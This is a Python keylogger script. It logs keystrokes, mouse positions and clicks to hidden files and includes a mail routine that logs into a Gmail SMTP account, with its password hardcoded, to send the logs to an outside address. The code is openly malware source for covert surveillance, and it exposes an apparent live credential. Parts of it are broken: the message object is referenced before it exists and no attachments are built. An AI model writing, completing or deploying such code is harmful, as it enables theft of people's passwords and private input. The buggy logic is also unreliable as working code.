import keyboard
import pyautogui
import time
import threading
import datetime
import pynput
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email import encoders


#Here is the function made to record the keys of users
def recordKeys():

    #This part add the date of key logs and removes the old logs
    with open('.keys.txt', 'w') as file:
        logtime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
        file.write(f"LOGS: {logtime} \n\n")


    #The kyes are recorded and added in the file, as the key is pressed
    while True:
        try:
            key = keyboard.read_key()
            event = keyboard.is_pressed(hotkey=key)
            if event:
                with open('.keys.txt', 'a') as file:
                    clocktime = datetime.datetime.now().strftime("%r")
                    file.write(f"'{key}'  At {clocktime}\n")

        #Just in case of any kind of ERROR, that will go into .ERROR.txt file
        except Exception as e:
            clocktime = datetime.datetime.now().strftime("%r")
            with open(".ERRORlogs.txt", 'a') as errorfile:
                errorfile.write(f'ERROR in Key Records: \n{e}\n\n')    


#The mouse will be Monitored from this function
def mouseMonitor():
    try:
        #This part added the size of display and log dates into the file, and removes the old logs
        size = pyautogui.size()
        logtime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
        
        with open('.mouse.txt', 'w') as file:
            file.write(f"LOGS: {logtime} \n")
            file.write(f"Size: {size.width}x{size.height} \n\n")
    except Exception as e:
            clocktime = datetime.datetime.now().strftime("%r")
            with open(".ERRORlogs.txt", 'a') as errorfile:
                errorfile.write(f'ERROR in Mouse Monitor first part: \n{e}\n\n') 
    
    #This variable ensures that the mouse is standby or not, and prevent the duplicate logs of mouse position
    Xcopy, Ycopy = 0, 0
    
    
    #The mouse position is recorded 5 times in a single second, and added into the file
    while True:
        try:
            position = pyautogui.position()
            if position.x != Xcopy or position.y != Ycopy:
                with open('.mouse.txt', 'a') as file:
                    clocktime = datetime.datetime.now().strftime("%r")
                    file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
                    Xcopy, Ycopy = position.x, position.y
                    time.sleep(0.2)

        
        #Just in case of any kind of ERROR, that will go into .ERROR.txt file
        except Exception as e:
            clocktime = datetime.datetime.now().strftime("%r")
            with open(".ERRORlogs.txt", 'a') as errorfile:
                errorfile.write(f'ERROR in Mouse Monitoring: \n{e}\n\n') 


#This function will activated when user clicks on the screen
def clickcheck(x, y, button, pressed, injected):
    #It gets the mouse position, and type of click and add it into the log file
    try:
        if pressed:
            position = pyautogui.position()
            clocktime = datetime.datetime.now().strftime("%r")
            with open('.mouse.txt', 'a') as file:
                file.write(f"Click '{button}': {position.x}   Y:{position.y}  At {clocktime} \n")

    #Just in case of any kind of ERROR, that will go into .ERROR.txt file
    except Exception as e:
            clocktime = datetime.datetime.now().strftime("%r")
            with open(".ERRORlogs.txt", 'a') as errorfile:
                errorfile.write(f'ERROR in Click checking: \n{e}\n\n') 



#The email sending is done with this Function, it includes the attachments of keyboard log file, and mouse monitoring log file, and ERROR file for understanding the situation
def sendMails():
    files = ['.keys.txt', '.mouse.txt', '.ERRORlogs.txt']

    while True:
        #Adding mail sending time
        clocktime = f"{datetime.datetime.now().strftime("%e")}th {datetime.datetime.now().strftime("%B")}  {datetime.datetime.now().strftime("%G")}"
        try:

            attachFiles = ['.keys.txt', '.mouse.txt', '.ERROR.txt']
                                        
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()

            server.login("tvboxhome00406@gmail.com", password="dzzkllpbvprpbpfm")
            server.sendmail("tvboxhome00406@gmail.com", "dhyeylukhi95@gmail.com", msg=clickread.as_string)

            
            print("Mail sent Successfull")


            """Adding this part in the mail sending function prevent the incomplete logs
            It is possible that the when the mail is sent, the file is writing logs"""
            keyboardThread = threading.Thread(target=recordKeys)
            mouseThread = threading.Thread(target=mouseMonitor)

            keyboardThread.start()
            mouseThread.start()
            with pynput.mouse.Listener(on_click=clickcheck) as clickread:
                keyboardThread.join()
                mouseThread.join()
                clickread.join()

        except Exception as e:
            pass
        


if __name__ == "__main__":
    print("Hello user...")
    print("I want to record some keys from your keyboard")
    sendMails()

    # keyboardThread = threading.Thread(target=recordKeys)
    # mouseThread = threading.Thread(target=mouseMonitor)
    # mailThread = threading.Thread(target=sendMails)

    # keyboardThread.start()
    # mouseThread.start()
    # mailThread.start()

    # with pynput.mouse.Listener(on_click=clickcheck) as clickread:
    #     keyboardThread.join()
    #     mouseThread.join()
    #     clickread.join()
    #     mailThread.join()



# almost everything is perfect

# just check the final working condition, and don't forgot to add the function which can send the files and error hadnling logs to your email